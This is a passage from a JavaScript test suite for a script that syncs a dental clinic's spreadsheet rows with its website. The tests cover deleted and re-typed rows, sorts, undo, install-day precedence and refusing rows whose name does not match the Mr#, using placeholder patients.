  env.deleteRows(GUL, rowOf(env, GUL, 'Sample Person One'));
  env.ticks(2);
  assert.ok(server.state.released.has(v.id) && server.state.released.has(c.id));
  assert.equal(rowOf(env, GUL, 'Sample Person One'), null);
  server.editVisit(v.id, { status: 'waiting' });
  server.editCheckup(c.id, { day_status: 'waiting' });
  env.ticks(3);
  assert.equal(server.visitById(v.id), v, 'the visit is not deleted');
  assert.equal(server.checkupById(c.id), c, 'the checkup is not deleted');
  assert.equal(cellOf(env, GUL, rowOf(env, GUL, 'Sample Person One'), 'sync key'), v.sheet_key, 'the visit row is back under its own key');
  assert.equal(cellOf(env, GUL, rowOf(env, GUL, 'Rel Check'), 'sync key'), c.sheet_key, 'so is the checkup row');
  env.ticks(2);
  assert.equal(server.state.removedLog.length, 0);
  assert.equal(server.state.visits.length, 2);
  assert.equal(server.state.checkups.length, 1);
});

test('RS5-D2: a website-made row that staff delete while other rows settle (a new patient typed in another tab, a Status changed) does not come back with a tick; it is removed once the tabs are quiet', () => {
  const LHR = 'Gulberg Lhr';
  const { env, server } = world({ tabs: [GUL, LHR], rows: { [GUL]: SYNCED_ROWS, [LHR]: [] }, patients: [...BASE_PATIENTS, ...SYNC_PATIENTS] });
  settle(env, 3);
  server.addPatient({ mr: '9790', name: 'Echo Web', phone: '03001110790' });
  const v = server.addVisit({ branch: 'GUL', date: TODAY, mr: '9790', status: 'waiting' });
  env.ticks(2);
  const r = rowOf(env, GUL, 'Echo Web');
  assert.ok(r);
  assert.equal(v.sheet_key, 'W-' + v.id, 'claimed');
  env.deleteRows(GUL, r);
  env.typeRow(LHR, 2, ['9703', 'Sample Person Six', '', 'Monthly', '', 'Waiting', '', '', '', '', '', '03001110006', '']);     // settling in another tab
  setCell(env, GUL, rowOf(env, GUL, 'Sample Person Three'), 'waiting', 'Treatment');                                             // another row of this tab is sent
  env.tickAfter(5000);
  assert.equal(rowOf(env, GUL, 'Echo Web'), null, 'the deleted website row is not added back while the removal is put off');
  env.advance(61000);
  env.ticks(3);
  assert.equal(server.visitById(v.id), undefined, 'removed once nothing settles any more (owner rule: a deleted row removes the visit)');
  assert.equal(rowOf(env, GUL, 'Echo Web'), null);
  assert.match(logText(env), /Echo Web .*the visit is removed from the website too/);
});

test('RS5-D2: the visible cells of a website-made row cleared (Delete key) while another row changes: the row is not added back; the visit goes like a deleted row', () => {
  const { env, server } = synced();
  server.addPatient({ mr: '9791', name: 'Clear Me', phone: '03001110791' });
  const v = server.addVisit({ branch: 'GUL', date: TODAY, mr: '9791', status: 'waiting' });
  env.ticks(2);
  const r = rowOf(env, GUL, 'Clear Me');
  env.clearRow(GUL, r, 1, colOf(env, GUL, 'website') - 1);
  setCell(env, GUL, rowOf(env, GUL, 'Sample Person Three'), 'waiting', 'Treatment');
  env.tickAfter(5000);
  assert.equal(rowOf(env, GUL, 'Clear Me'), null, 'not added back in the minute its name was cleared');
  env.advance(61000);
  env.ticks(3);
  assert.equal(server.visitById(v.id), undefined);
  assert.equal(rowOf(env, GUL, 'Clear Me'), null);
});

test('RS5-D2: a website-made row cut and pasted with its visible cells only while the website changes: no second row; the pasted row keeps the visit', () => {
  const { env, server } = synced();
  server.addPatient({ mr: '9792', name: 'Move Me', phone: '03001110792' });
  const v = server.addVisit({ branch: 'GUL', date: TODAY, mr: '9792', status: 'waiting' });
  env.ticks(2);
  const sh = env.tab(GUL);
  const kc = colOf(env, GUL, 'website');
  const r = rowOf(env, GUL, 'Move Me');
  const cells = []; for (let c = 1; c < kc; c++) cells.push(sh._get(r, c));
  for (let c = 1; c < kc; c++) sh._set(r, c, null);
  cells.forEach((cell, i) => { if (cell) sh._set(12, i + 1, cell); });
  env.ctx.aajOnEdit({ range: sh.getRange(12, 1, 1, kc - 1), source: env.book });
  server.editVisit(webVisit(server, 'Sample Person Two').id, { details: 'changed on the website' });
  env.tickAfter(5000);
  env.advance(61000);
  env.ticks(3);
  const rows = [...Array(14).keys()].map((i) => i + 2).filter((x) => cellOf(env, GUL, x, 'patients name') === 'Move Me');
  assert.deepEqual(rows, [12], 'one row for the patient, the pasted one');
  assert.equal(server.visitById(v.id), v, 'the same visit');
  assert.equal(v.sheet_key, cellOf(env, GUL, 12, 'sync key'));
  assert.equal(statusOf(env, GUL, 12), '✓ On website');
});

test('RS5-B2: deleting the row of a No show patient removes the visit (owner: "deleted patient means wrong entry, or patient didnt come"); with an invoice it stays No show and the row does not come back', () => {
  const { env, server } = synced();
  const v3 = webVisit(server, 'Sample Person Three');
  server.editVisit(v3.id, { status: 'no_show' });
  env.ticks(1);
  env.deleteRows(GUL, rowOf(env, GUL, 'Sample Person Three'));
  env.ticks(2);
  assert.equal(server.visitById(v3.id), undefined, 'nothing attached: removed like a Waiting visit');
  assert.equal(rowOf(env, GUL, 'Sample Person Three'), null, 'and its row is not put back');
  const v5 = webVisit(server, 'Sample Person Five');
  v5.attached = true;
  server.editVisit(v5.id, { status: 'no_show' });
  env.ticks(1);
  env.deleteRows(GUL, rowOf(env, GUL, 'Sample Person Five'));
  env.ticks(3);
  assert.equal(server.visitById(v5.id), v5, 'an invoice on it: kept');
  assert.equal(v5.status, 'no_show', 'as it was (No show), not marked Cancelled');
  assert.equal(rowOf(env, GUL, 'Sample Person Five'), null, 'the row is not put back');
  assert.match(logText(env), /Sample Person Five .*stays on the website as No show/);
  quiet(env, server);
});

test('RS5-A1: a cancelled patient whose row was deleted is typed again when she turns up: the visit is Waiting again with what was typed (the row is not rewritten to Cancelled)', () => {
  const { env, server } = synced();
  const v = webVisit(server, 'Sample Person Three');
  server.editVisit(v.id, { status: 'cancelled', treatment_label: 'Scaling' });
  env.ticks(1);
  env.deleteRows(GUL, rowOf(env, GUL, 'Sample Person Three'));
  env.ticks(2);
  const r = env.tab(GUL).used().rows + 1;
  env.typeRow(GUL, r, ['9702', 'Sample Person Three', '', 'RCT', '', 'Waiting', '', '', 'came after all', '', '', '03001110003', '']);
  env.advance(61000);
  env.ticks(3);
  assert.equal(server.state.visits.filter((x) => x.mr === '9702').length, 1, 'the same visit, adopted');
  assert.equal(v.status, 'waiting');
  assert.equal(v.treatment_label, 'RCT');
  assert.equal(v.details, 'came after all');
  assert.equal(cellOf(env, GUL, r, 'waiting'), 'Waiting', 'the row keeps what was typed');
  assert.equal(cellOf(env, GUL, r, 'treatment'), 'RCT');
  assert.equal(statusOf(env, GUL, r), '✓ On website');
  // the same for a No show patient typed again with the Status cell left empty: Waiting again, and the website fills the cell
  const v5 = webVisit(server, 'Sample Person Five');
  server.editVisit(v5.id, { status: 'no_show' });
  env.ticks(1);
  v5.attached = true;                                   // an invoice on it: the deleted row keeps the visit (No show), the row stays deleted
  env.deleteRows(GUL, rowOf(env, GUL, 'Sample Person Five'));
  env.ticks(2);
  assert.equal(server.visitById(v5.id), v5);
  const r5 = env.tab(GUL).used().rows + 1;
  env.typeRow(GUL, r5, ['9705', 'Sample Person Five', '', 'Consultation checkup', '', '', '', '', '', '', '', '', '']);
  env.advance(61000);
  env.ticks(3);
  assert.equal(v5.status, 'waiting');
  assert.equal(cellOf(env, GUL, r5, 'waiting'), 'Waiting', 'the empty Status cell is filled by the website');
});

test('RS5-N1: a correct Mr# typed with an everyday spelling of the name ("Umar Farooq" for "Umer Farooq") and no phone gets the visit with a plain tick (11 Oct 2026: it fits without doubt); "Sana Khan" with the Mr# of "Sara Khan" is refused without naming her', () => {
  const rows = [['9811', 'Umar Farooq', '', 'Filling', '', 'Waiting', '', '', '', '', '', '', ''], ['9812', 'Sana Khan', '', 'Filling', '', 'Waiting', '', '', '', '', '', '', '']];
  const { env, server } = world({ rows: { [GUL]: rows }, patients: [{ mr: '9811', name: 'Umer Farooq' }, { mr: '9812', name: 'Sara Khan' }] });
  settle(env, 3);
  assert.deepEqual(server.state.visits.map((v) => v.mr), ['9811']);
  assert.equal(statusOf(env, GUL, 2), '✓ On website');
  assert.equal(statusOf(env, GUL, 3), "✗ Needs attention: the name in this row does not match Mr# 9812 on the website. Check the Mr#, or type the name as the website has it.");
});

test('11 Oct 2026 (abuse-privacy M1/M2): "Ayesha Rajpoot" typed with the Mr# of Ayesha Khan, who is on today\'s list, is refused; Ayesha Khan\'s visit and empty phone are untouched; with the Mr# corrected the row goes through', () => {
  const rows = [['9601', 'Ayesha Rajpoot', '', 'RCT', '', 'Completed', '', '', '', '', '', '03007779602', '']];
  const { env, server } = world({ rows: { [GUL]: rows }, patients: [{ mr: '9601', name: 'Ayesha Khan' }, { mr: '9602', name: 'Ayesha Rajpoot' }] });
  const khan = server.addVisit({ branch: 'GUL', date: TODAY, mr: '9601', status: 'waiting', treatment: 'Consultation' });
  settle(env, 3);
  assert.equal(statusOf(env, GUL, 2), '✗ Needs attention: the name in this row does not match Mr# 9601 on the website. Check the Mr#, or type the name as the website has it.');
  assert.equal(khan.status, 'waiting'); assert.equal(khan.treatment_label, 'Consultation');
  assert.equal(khan.sheet_key, 'W-' + khan.id, 'never adopted by the refused row (only her own website row, added to the sheet, holds it)');
  assert.equal(server.patientByMr('9601').phone, null, 'no phone written into her file');
  assert.equal(server.state.visits.filter((x) => x.mr === '9602').length, 0);
  assert.equal(rowOf(env, GUL, 'Ayesha Khan') !== null, true, 'her own visit is added to the sheet as a website row');
  // staff correct the Mr# to her own
  setCell(env, GUL, 2, 'mr', '9602');
  settle(env, 3);
  assert.equal(statusOf(env, GUL, 2), '✓ On website');
  const raj = server.state.visits.find((x) => x.mr === '9602');
  assert.ok(raj && raj.status === 'completed' && raj.treatment_label === 'RCT');
  assert.equal(server.patientByMr('9602').phone, '03007779602', 'the right patient\'s empty phone is filled');
  assert.equal(khan.status, 'waiting'); assert.equal(khan.treatment_label, 'Consultation'); assert.equal(server.patientByMr('9601').phone, null);
});

test('11 Oct 2026 (sheet-behaviour L2-residual): a linked row typed over with another person (the Mr# left in) is refused on EVERY answer, also after each Status edit; nothing reaches the first patient\'s visit; with the name put back the row goes through', () => {
  const rows = [['9501', 'First Patient', '', 'Consultation', '', 'Waiting', '', '', '', '', '', '03001119501', '']];
  const { env, server } = world({ rows: { [GUL]: rows }, patients: [{ mr: '9501', name: 'First Patient', phone: '03001119501' }, { mr: '9502', name: 'Second Person', phone: '03007770002' }] });
  settle(env, 3);
  const v = server.state.visits.find((x) => x.mr === '9501');
  assert.ok(v);
  assert.equal(statusOf(env, GUL, 2), '✓ On website');
  const REFUSED = '✗ Needs attention: the name in this row does not match Mr# 9501 on the website. Check the Mr# or the name: nothing in this row is saved until they match.';
  setCell(env, GUL, 2, 'patient', 'Second Person');
  setCell(env, GUL, 2, 'contact', '03007770002');
  setCell(env, GUL, 2, 'treatment', 'Filling');
  settle(env, 2);
  assert.equal(statusOf(env, GUL, 2), REFUSED);
  assert.equal(v.treatment_label, 'Consultation'); assert.equal(v.status, 'waiting');
  // the next routine edits (Status) still get the refusal: never a plain tick on the first patient's visit
  setCell(env, GUL, 2, 'waiting', 'Treatment');
  settle(env, 2);
  assert.equal(statusOf(env, GUL, 2), REFUSED);
  setCell(env, GUL, 2, 'waiting', 'Completed');
  settle(env, 2);
  assert.equal(statusOf(env, GUL, 2), REFUSED);
  assert.equal(v.status, 'waiting'); assert.equal(v.treatment_label, 'Consultation'); assert.equal(v.override, false);
  assert.equal(server.patientByMr('9501').name, 'First Patient'); assert.equal(server.patientByMr('9501').phone, '03001119501');
  assert.equal(server.state.visits.filter((x) => x.mr === '9501').length, 1);
  assert.equal(server.state.visits.filter((x) => x.mr === '9502').length, 0, 'never re-pointed to another patient');
  assert.equal(cellOf(env, GUL, 2, 'patient'), 'Second Person', 'what staff typed stays in the row for them to fix');
  // the name and phone put back: the row goes through with what it shows now
  setCell(env, GUL, 2, 'patient', 'First Patient');
  setCell(env, GUL, 2, 'contact', '03001119501');
  settle(env, 3);
  assert.equal(statusOf(env, GUL, 2), '✓ On website');
  assert.equal(v.status, 'completed'); assert.equal(v.treatment_label, 'Filling');
});

test('Lahore and Islamabad: a bare number in the Token column ("2" units) is sent as text, never as the website\'s token number (owner, 13:20)', () => {
  const LHR = 'Gulberg Lhr';
  const cols = web.detectColumns(fixture.headers[LHR]);
  const row = fixture.rows[LHR][0].slice();
  row[cols.mr] = '9701'; row[cols.name] = 'Sample Person One'; row[cols.token] = '2'; row[cols.month] = ''; row[cols.phone] = '03001110001';
  const { env, server } = world({ tabs: [LHR], rows: { [LHR]: [row] }, patients: BASE_PATIENTS });
  settle(env, 3);
  const sent = rowsSent(server).filter((r) => r.set.token);
  assert.ok(sent.length >= 1);
  assert.ok(sent.every((r) => r.set.token.t === '2' && r.set.token.v === null), JSON.stringify(sent.map((r) => r.set.token)));
  assert.equal(cellOf(env, LHR, 2, 'token'), '2', 'the cell stays as typed');
});

test('a checkup that was deleted on the website: its row says "checkup", not "visit"', () => {
  const { env, server } = ckWorld();
  const c = server.state.checkups.find((x) => x.name === 'Check One');
  server.removeCheckup(c.id);
  env.ticks(2);
  assert.equal(statusOf(env, GUL, 2), '✗ This checkup was deleted on the website. Delete this row.');
});

// ------------------------------------------------------------------------------------------------ loop 2 of 11 Oct 2026: rows the website said "deleted" about; install day; a filled-in file
const GONE = '✗ This visit was deleted on the website. Delete this row.';
const visitOfMr = (server, mr) => server.state.visits.filter((v) => v.mr === mr);

test('RSG-1: front desk deletes a visit on the website (a wrong entry) and staff type a NEW patient over its row: the new patient reaches the website; nothing else changes', () => {
  const { env, server } = synced();
  server.addPatient({ mr: '9750', name: 'Sample Person Fifty', phone: '03001110050' });
  const r = rowOf(env, GUL, 'Sample Person Five');
  server.removeVisit(webVisit(server, 'Sample Person Five').id);
  env.ticks(1);
  assert.equal(statusOf(env, GUL, r), GONE);
  const before = server.state.visits.map((v) => v.id).sort();
  env.typeRow(GUL, r, ['9750', 'Sample Person Fifty', '', 'Consultation', '', 'Waiting', '', '', 'new walk-in', '', '', '03001110050', '']);
  env.advance(61000);
  env.ticks(3);
  assert.equal(visitOfMr(server, '9750').length, 1, 'the patient typed over the "deleted" row is on the website');
  assert.equal(visitOfMr(server, '9750')[0].sheet_key, cellOf(env, GUL, r, 'sync key'), 'under the row\'s new key');
  assert.equal(statusOf(env, GUL, r), '✓ On website');
  assert.equal(visitOfMr(server, '9705').length, 0, 'the deleted visit is not made again');
  assert.deepEqual(server.state.visits.map((v) => v.id).filter((id) => before.includes(id)).sort(), before, 'nobody else\'s visit is touched');
  assert.equal(server.state.removedLog.length, 0, 'nothing removed');
  quiet(env, server);
});

test('RSG-1: a "deleted on the website" row and a refused row in a sort of the visible columns: nobody\'s visit is removed, the deleted patient is not made again, each row keeps its own message', () => {
  const { env, server } = synced();
  env.typeRow(GUL, 8, ['60001', 'Typo Person', '', 'Ext', '', 'Waiting', '', '', '', '', '', '03001110060', '']);
  env.advance(61000);
  env.ticks(2);
  const typoText = statusOf(env, GUL, 8);
  assert.match(typoText, /^✗ Mr# 60001 is not on the website/);
  server.removeVisit(webVisit(server, 'Sample Person Five').id);
  env.ticks(1);
  assert.equal(statusOf(env, GUL, rowOf(env, GUL, 'Sample Person Five')), GONE);
  const before = server.state.visits.map((v) => v.id + ':' + v.mr).sort();
  sortVisibleBy(env, GUL, [2, 3, 4, 5, 6, 7, 8], 'treatment');
  assert.equal(rowOf(env, GUL, 'Sample Person Five'), 3, 'the sort moved the "deleted" person to another row');
  assert.equal(rowOf(env, GUL, 'Typo Person'), 4);
  env.touch();
  env.advance(61000);
  env.ticks(4);
  assert.deepEqual(server.state.visits.map((v) => v.id + ':' + v.mr).sort(), before, 'every patient on the sheet keeps the same visit');
  assert.equal(server.state.removedLog.length, 0, 'nothing was removed');
  assert.equal(visitOfMr(server, '9705').length, 0, 'the visit front desk deleted is not made again');
  assert.equal(statusOf(env, GUL, 3), GONE, 'the deleted person\'s row still says so');
  assert.equal(statusOf(env, GUL, 4), typoText, 'the refused row keeps its own answer');
  for (const name of ['Sample Person One', 'Sample Person Two', 'Sample Person Three', 'Sample Person Four', 'Sample Person Six']) {
    const rr = rowOf(env, GUL, name);
    assert.ok(/^[✓⚠]/.test(statusOf(env, GUL, rr)), name + ': ' + statusOf(env, GUL, rr));
    assert.equal(cellOf(env, GUL, rr, 'sync key'), webVisit(server, name).sheet_key, name + ' carries its own visit\'s key');
  }
});

test('RSG-1: the same sort with a row typed a moment ago in it (not answered by the website yet, so the rows did not only swap): the "deleted" memory still goes with its person; the deleted visit is not made again', () => {
  const { env, server } = synced();
  server.removeVisit(webVisit(server, 'Sample Person Five').id);
  env.ticks(1);
  server.addPatient({ mr: '9760', name: 'Brand New', phone: '03001110060' });
  env.typeRow(GUL, 8, ['9760', 'Brand New', '', 'Consultation', '', 'Waiting', '', '', '', '', '', '03001110060', '']);
  env.tickAfter(5000);                                   // keyed, still settling: no memory yet
  const before = server.state.visits.map((v) => v.id).sort();
  sortVisibleBy(env, GUL, [2, 3, 4, 5, 6, 7, 8], 'treatment');
  assert.equal(rowOf(env, GUL, 'Sample Person Five'), 4, 'the "deleted" person moved, in the same chain of moves as the new row');
  env.touch();
  env.advance(61000);
  env.ticks(4);
  assert.equal(visitOfMr(server, '9705').length, 0, 'the visit front desk deleted is not made again');
  assert.equal(statusOf(env, GUL, 4), GONE);
  assert.equal(server.state.removedLog.length, 0, 'nothing removed');
  assert.deepEqual(server.state.visits.map((v) => v.id).filter((id) => before.includes(id)).sort(), before, 'every other patient keeps the same visit');
  assert.equal(visitOfMr(server, '9760').length, 1, 'the new patient is on the website');
});

test('RSG-1: a checkup deleted on the website\'s Checkups page (a wrong entry), then a sort of the visible columns: no patient\'s visit is removed, the wrong checkup does not come back', () => {
  const rows = [['9701', 'Sample Person One', '', 'Scaling', '', 'Waiting', '', '', '', '', '', '03001110001', ''], ckRow('Wrong Entry', '03009990001'),
    ['146', 'Sample Person Two', '', 'Ext', '', 'Waiting', '', '', '', '', '', '03001110002', ''], ['9703', 'Sample Person Six', '', 'Filling', '', 'Waiting', '', '', '', '', '', '03001110006', '']];
  const { env, server } = world({ rows: { [GUL]: rows }, patients: BASE_PATIENTS });
  settle(env, 3);
  server.removeCheckup(server.state.checkups.find((c) => c.name === 'Wrong Entry').id);
  env.ticks(1);
  assert.equal(statusOf(env, GUL, 3), '✗ This checkup was deleted on the website. Delete this row.');
  const before = server.state.visits.map((v) => v.id).sort();
  sortVisibleBy(env, GUL, [2, 3, 4, 5], 'treatment');
  assert.equal(rowOf(env, GUL, 'Wrong Entry'), 2);
  env.touch();
  env.advance(61000);
  env.ticks(4);
  assert.deepEqual(server.state.visits.map((v) => v.id).sort(), before, 'no visit removed or made');
  assert.equal(server.state.checkups.length, 0, 'the deleted checkup is not made again');
  assert.equal(server.state.removedLog.length, 0);
  assert.equal(statusOf(env, GUL, 2), '✗ This checkup was deleted on the website. Delete this row.');
});

test('RSG-2: a row deleted, the patient typed again, then Ctrl+Z: the old row says "deleted on the website" at once (no stale tick), and the old visit never comes back behind it later', () => {
  const { env, server } = synced();
  const sh = env.tab(GUL);
  const r3 = rowOf(env, GUL, 'Sample Person Three');
  const width = sh.used().cols;
  const saved = []; for (let c = 1; c <= width; c++) saved.push(sh._get(r3, c));
  const v1 = webVisit(server, 'Sample Person Three');
  env.deleteRows(GUL, r3);
  env.ticks(2);
  assert.equal(server.visitById(v1.id), undefined, 'removed');
  const rN = sh.used().rows + 1;
  env.typeRow(GUL, rN, ['9702', 'Sample Person Three', '', 'RCT', '', 'Waiting', '', '', 'typed again', '', '', '03001110003', '']);
  env.advance(61000);
  env.ticks(2);
  const v2 = webVisit(server, 'Sample Person Three');
  assert.ok(v2 && v2.id !== v1.id && v2.treatment_label === 'RCT', 'typed again: a new visit');
  // Ctrl+Z of the delete: the row is back at its place with its hidden cells
  sh.insertRowsAfter(sh.getMaxRows(), 1);
  for (let rr = sh.used().rows; rr >= r3; rr--) for (let c = 1; c <= width; c++) { const x = sh._get(rr, c); sh._set(rr + 1, c, x); sh._set(rr, c, null); }
  saved.forEach((cell, i) => { if (cell) sh._set(r3, i + 1, cell); });
  env.ctx.aajOnChange({ changeType: 'INSERT_ROW', source: env.book });
  env.ticks(1);
  assert.equal(statusOf(env, GUL, r3), GONE, 'the row put back says at once that its visit is not on the website');
  assert.equal(server.visitById(v1.id), undefined, 'not put back: the patient is on the list in the other row');
  assert.equal(visitOfMr(server, '9702').length, 1);
  // staff delete the row they typed again: the old visit is not put back later under the row that says "deleted"
  const retyped = [...Array(sh.used().rows).keys()].map((i) => i + 1).find((x) => x !== r3 && sh.text(x, colOf(env, GUL, 'patients name')) === 'Sample Person Three');
  assert.equal(cellOf(env, GUL, retyped, 'treatment'), 'RCT');
  env.deleteRows(GUL, retyped);
  env.ticks(3);
  assert.equal(visitOfMr(server, '9702').length, 0, 'the row typed again went, and nothing came back by itself');
  assert.equal(statusOf(env, GUL, r3), GONE, 'the row that said "deleted" is still honest');
});

// (RSG-2, a visit moved to another day and back: now in the RS8-B1 tests at the end of this file. The move lets go of the sheet key, so a
// row made in the sheet is not linked again; a website-made row, whose key is the visit's own, is.)

test('RSI-1: install day: rows Set up stamps as today\'s are not newer than what front desk did on the website that morning: a Cancelled or No show visit stays, a Waiting visit keeps its text', () => {
  const rows = [['9701', 'Sample Person One', '', 'Scaling', '', 'Waiting', '', '', 'sheet a', '', '', '03001110001', ''],
    ['146', 'Sample Person Two', '', 'Scaling', '', '', '', '', 'sheet b', '', '', '03001110002', ''],
    ['9703', 'Sample Person Six', '', 'Filling', '', 'Waiting', '', '', 'sheet c', '', '', '03001110006', '']];
  const { env, server } = world({ rows: { [GUL]: rows }, patients: BASE_PATIENTS, install: false, helpers: false });
  const hourAgo = env.clock.ms - 3600000;
  const vA = server.addVisit({ branch: 'GUL', date: TODAY, mr: '9701', status: 'waiting', treatment: 'Consultation', details: 'web a' });
  const vB = server.addVisit({ branch: 'GUL', date: TODAY, mr: '146', status: 'cancelled', treatment: 'Scaling', details: 'phoned: not coming' });
  const vC = server.addVisit({ branch: 'GUL', date: TODAY, mr: '9703', status: 'no_show', treatment: 'Filling' });
  for (const v of [vA, vB, vC]) v.updated_at = hourAgo;
  scripted(env);
  env.ctx.aajSetup();
  env.ticks(2);
  const firstSends = rowsSent(server).filter((x) => x.new);
  assert.ok(firstSends.length >= 3 && firstSends.every((x) => x.edited_at === null), 'rows nobody edited since Set up carry no edit time: ' + JSON.stringify(firstSends.map((x) => x.edited_at)));
  assert.equal(server.state.visits.length, 3, 'linked, nothing doubled');
  assert.equal(vB.status, 'cancelled', 'the visit front desk cancelled stays Cancelled');
  assert.equal(vC.status, 'no_show', 'the No show stays');
  assert.equal(vA.treatment_label, 'Consultation', 'the waiting visit keeps the website\'s treatment');
  assert.equal(vA.details, 'web a');
  assert.equal(cellOf(env, GUL, 3, 'waiting'), 'Cancelled', 'the sheet shows the website\'s status');
  assert.match(statusOf(env, GUL, 2), /^⚠ Website change kept for: Treatment/);
  // an edit made after Set up is an ordinary edit: it carries its time and wins
  setCell(env, GUL, 2, 'treatment details', 'typed later');
  env.advance(61000);
  env.ticks(2);
  const later = rowsSent(server).filter((x) => x.key === vA.sheet_key && x.set.details === 'typed later');
  assert.ok(later.length === 1 && Number.isFinite(later[0].edited_at), 'sent with its edit time');
  assert.equal(vA.details, 'typed later');
});

test('RSX-1: a Healthwire Mr# typed with a slip, front desk fills that new file, then the Mr# is corrected: the right patient gets the visit, the filled-in file is kept and the log says to check it', () => {
  const rows = [['9888', 'Slip Person', '', 'Consultation', '', 'Waiting', '', '', '', '', '', '03001116003', '']];
  const { env, server } = world({ rows: { [GUL]: rows }, patients: BASE_PATIENTS });
  settle(env, 3);
  server.editPatient('9888', { notes: 'allergy: penicillin' });
  setCell(env, GUL, 2, 'mr', '9878');
  env.advance(61000);
  env.ticks(4);
  assert.ok(server.patientByMr('9888'), 'the file front desk filled in is kept');
  assert.equal(server.patientByMr('9888').notes, 'allergy: penicillin');
  assert.deepEqual(server.state.visits.map((v) => v.mr), ['9878'], 'the visit is on the corrected Mr#');
  assert.match(logText(env), /The patient file made from this row \(Mr# 9888\) is kept: details were saved on it on the website\. Check it/);
});

// ------------------------------------------------------------------------------------------------ fix loop 2 (2026-10-11): L2-residual, SB7-1, SB7-2
test('L2-residual (titles): "Muhammad Usman" typed with the Mr# of Usman Tariq, and "Usman Tariq" with the Mr# of a file named "Muhammad Usman", are refused; nothing is made', () => {
  const rows = [['9821', 'Muhammad Usman', '', 'RCT', '', 'Completed', '', '', '', '', '', '03001119821', ''], ['9822', 'Usman Tariq', '', 'Scaling', '', 'Waiting', '', '', '', '', '', '', '']];
  const { env, server } = world({ rows: { [GUL]: rows }, patients: [{ mr: '9821', name: 'Usman Tariq' }, { mr: '9822', name: 'Muhammad Usman' }] });
  settle(env, 3);
  assert.equal(server.state.visits.length, 0, 'no visit on either patient');
  assert.equal(statusOf(env, GUL, 2), '✗ Needs attention: the name in this row does not match Mr# 9821 on the website. Check the Mr#, or type the name as the website has it.');
  assert.equal(statusOf(env, GUL, 3), '✗ Needs attention: the name in this row does not match Mr# 9822 on the website. Check the Mr#, or type the name as the website has it.');
  assert.equal(server.patientByMr('9821').phone, null, 'no phone written into Usman Tariq\'s file');
});

test('L2-residual (titles): Usman Tariq\'s linked row typed over with "Muhammad Usman", RCT, Completed (the Mr# left in): refused, his visit stays Waiting / Scaling', () => {
  const rows = [['9831', 'Usman Tariq', '', 'Scaling', '', 'Waiting', '', '', '', '', '', '03001119831', '']];
  const { env, server } = world({ rows: { [GUL]: rows }, patients: [{ mr: '9831', name: 'Usman Tariq', phone: '03001119831' }] });
  settle(env, 3);
  const v = server.state.visits.find((x) => x.mr === '9831');
  assert.ok(v);
  setCell(env, GUL, 2, 'patient', 'Muhammad Usman');
  setCell(env, GUL, 2, 'treatment', 'RCT');
  setCell(env, GUL, 2, 'waiting', 'Completed');
  settle(env, 3);
  assert.equal(statusOf(env, GUL, 2), '✗ Needs attention: the name in this row does not match Mr# 9831 on the website. Check the Mr# or the name: nothing in this row is saved until they match.');
  assert.deepEqual([v.status, v.treatment_label], ['waiting', 'Scaling']);
  assert.equal(server.patientByMr('9831').name, 'Usman Tariq');
});

test('SB7-1: a sort of the visible columns while the website answers the call that makes a NEW row: no visit is deleted, and every row ends on its own patient\'s visit', () => {
  const NAMES = ['Race Person One', 'Race Person Two', 'Race Person Three', 'Race Person Four'];
  const row = (i, tr) => ['980' + i, NAMES[i - 1], '', tr, '', 'Waiting', '', '', '', '', '', '0300111880' + i, ''];
  const { env, server } = world({ rows: { [GUL]: [row(1, 'Scaling'), row(2, 'RCT'), row(4, 'Filling')] },
    patients: [1, 2, 3, 4].map((i) => ({ mr: '980' + i, name: NAMES[i - 1], phone: '0300111880' + i })) });
  settle(env, 3);
  assert.equal(server.state.visits.length, 3);
  env.typeRow(GUL, 5, row(3, 'Consultation'));
  // during the call that makes Race Person Three's visit, somebody sorts the table by Treatment (only the visible columns move)
  const send = env.fetchHandler;
  let sorted = false;
  env.fetchHandler = (req) => {
    const out = send(req);
    const tabs = JSON.parse(req.body).p_payload.tabs;
    if (!sorted && tabs.some((t) => t.rows.some((x) => x.new && x.set.name === 'Race Person Three'))) {
      sorted = true;
      sortVisibleBy(env, GUL, [2, 3, 4, 5], 'treatment');
      env.touch();
    }
    return out;
  };
  env.advance(61000);
  env.ticks(1);
  assert.ok(sorted, 'the sort landed during that call');
  assert.equal(rowOf(env, GUL, 'Race Person Three'), 2, 'Race Person Three is in row 2 now; row 5 holds Race Person One');
  const n0 = server.calls.length;
  env.ticks(1);
  assert.ok(server.calls.length > n0 && server.calls.slice(n0).every((c) => c.payload.check_removed === false), 'no removal pass in the minute that finds the key under somebody else');
  env.ticks(5);
  assert.equal(server.state.removedLog.length, 0, 'nothing was removed: ' + JSON.stringify(server.state.removedLog.map((x) => x.key)));
  assert.equal(server.state.visits.length, 4, 'four visits, one each');
  for (const n of NAMES) {
    const r = exactRow(env, GUL, n);
    const vs = visitsOfPatient(server, n);
    assert.equal(vs.length, 1, n);
    assert.equal(cellOf(env, GUL, r, 'sync key'), vs[0].sheet_key, n + ' sits on its own visit');
    assert.equal(statusOf(env, GUL, r), '✓ On website', n + ': ' + statusOf(env, GUL, r));
  }
  quiet(env, server);
});

test('SB7-1: a key whose first answer never came back stays with its row while the row still shows the same Mr#, name and phone (the lost answer is found again, nothing doubles)', () => {
  const { env, server } = world({ patients: BASE_PATIENTS });
  env.ticks(1);
  const sh = env.tab(GUL);
  const bc = colOf(env, GUL, 'sync base');
  const pending = JSON.parse(sh.text(2, bc));
  assert.equal(pending.p, 1, 'the key is written with what will be sent');
  assert.equal(pending.s.name, env.call('aajFieldKey', 'name', cellOf(env, GUL, 2, 'patient')));
  env.advance(61000);
  server.faults.lostAnswers = 1;
  env.ticks(1);
  const keysBefore = keysOf(env, GUL);
  env.ticks(2);
  assert.deepEqual(keysOf(env, GUL), keysBefore, 'the rows kept their keys');
  assert.equal(server.state.visits.length + server.state.checkups.length, 6);
  assert.equal(server.state.removedLog.length, 0);
});

test('SB7-2: install day: a row Set up stamped (no edit time) that says Completed completes the visit front desk added as Waiting; the website\'s Treatment stays and the row says so; a Cancelled visit stays Cancelled', () => {
  const rows = [['9701', 'Sample Person One', '', 'RCT', '', 'Completed', '', '', 'done', '', '', '03001110001', ''],
    ['146', 'Sample Person Two', '', 'Scaling', '', 'Completed', '', '', '', '', '', '03001110002', '']];
  const { env, server } = world({ rows: { [GUL]: rows }, patients: BASE_PATIENTS, install: false, helpers: false });
  const hourAgo = env.clock.ms - 3600000;
  const vA = server.addVisit({ branch: 'GUL', date: TODAY, mr: '9701', status: 'waiting', treatment: 'Consultation' });
  const vB = server.addVisit({ branch: 'GUL', date: TODAY, mr: '146', status: 'cancelled', treatment: 'Scaling', details: 'phoned: not coming' });
